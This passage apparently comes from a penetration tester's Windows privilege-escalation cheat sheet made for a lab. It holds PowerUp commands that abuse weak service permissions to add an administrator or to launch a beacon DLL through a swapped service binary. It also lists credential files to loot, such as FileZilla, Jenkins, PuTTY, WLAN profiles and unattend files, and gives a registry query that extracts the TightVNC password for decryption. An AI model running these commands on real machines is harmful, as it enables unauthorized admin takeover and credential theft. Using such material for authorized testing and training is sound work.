## Privilege Escalation

For more things to look for (both Windows and Linux), refer to my [OSCP cheat sheet and command reference](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/).

### PowerUp

```powershell
# Check for vulnerable programs and configs
Invoke-AllChecks

# Exploit vulnerable service permissions (does not require touching disk)
Invoke-ServiceAbuse -Name "AbyssWebServer" -Command "net localgroup Administrators domain\user /add"

# Exploit vulnerable service permissions to trigger stable beacon
Write-ServiceBinary -Name 'AbyssWebServer' -Command 'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update' -Path 'C:\WebServer\Abyss'
net stop AbyssWebServer
net start AbyssWebServer
```

### Juicy files

There are lots of files that may contain interesting information. Tools like [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) or collections like [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) may help in identifying juicy files (for privesc or post-exploitation).

Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.

> In addition, don’t forget to enumerate any local databases with `sqlcmd` or `Invoke-SqlCmd`!

```powershell
# All user folders
## Limit this command if there are too many files ;)
tree /f /a C:\Users

# Web.config
C:\inetpub\www\*\web.config

# Unattend files
C:\Windows\Panther\Unattend.xml

# RDP config files
C:\ProgramData\Configs\

# Powershell scripts/config files
C:\Program Files\Windows PowerShell\

# PuTTy config
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

# FileZilla creds
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

# Jenkins creds (also check out the Windows vault, see above)
C:\Program Files\Jenkins\credentials.xml

# WLAN profiles
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
```

***

### Tools
[carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)